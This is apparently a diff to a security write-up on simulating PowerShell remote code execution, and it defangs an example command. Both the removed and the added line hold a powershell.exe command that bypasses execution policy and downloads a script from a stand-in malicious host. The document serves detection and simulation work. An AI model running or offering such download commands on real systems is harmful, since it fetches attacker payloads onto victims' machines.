@@ -39,7 +39,7 @@ PowerShell-based command execution intended to mimic Remote Code Execution (RCE)
 ### Example command used for simulation:
 
 powershell
-powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest http://malicious-domain/test.ps1 -OutFile test.ps1"
+powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest hxxp://malicious-domain/test[.]ps1 -OutFile test[.]ps1"
 
 ## Behavioral Indicators Observed
 
